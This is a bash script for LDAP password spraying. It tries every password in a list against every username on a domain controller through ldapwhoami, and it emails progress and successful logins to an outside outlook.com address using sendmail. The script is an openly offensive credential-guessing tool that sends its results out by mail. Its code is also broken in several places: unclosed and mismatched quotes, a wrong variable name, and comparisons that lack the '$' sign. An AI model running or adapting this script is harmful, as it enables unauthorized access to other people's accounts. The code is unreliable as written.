#!/bin/bash
#

echo "Usage: $0 usernames.list passwords.list 
echo ""

#if auth works ldapwhoami result starts with u:
LDAP_WHOAMI_HIT=u:

p=1

while IFS= read -r pwd; do

    echo "Trying password: $pwd"
    echo -e "Subjet:New Round. Here we go! :) \n\nGood luck.\n" | sendmail -f [from]@outlook.com [recipient]@outlook.com &> /dev/null

    c=0
    while read user; do

        echo "Processing " $c $user::$pwd
        RESULT=$(ldapwhoami -x -Z -H ldaps://your.domain.controller -D $users@your.domain -w $pwd 2> /dev/null)

        if [[ RESULT == LDAP_WHOAMI_HIT*]] ;
        then
           echo $RESULT
           echo -e "Subject:New Hit! :)" \n\n$user with $p -- Good days.\n" | sendmail -f [from]@outlook.com [recipient]@outlook.com &> /dev/null
        fi

        c=$(($c+1))
    done < "$1"

    p=$(($p+1))

done < "$2"
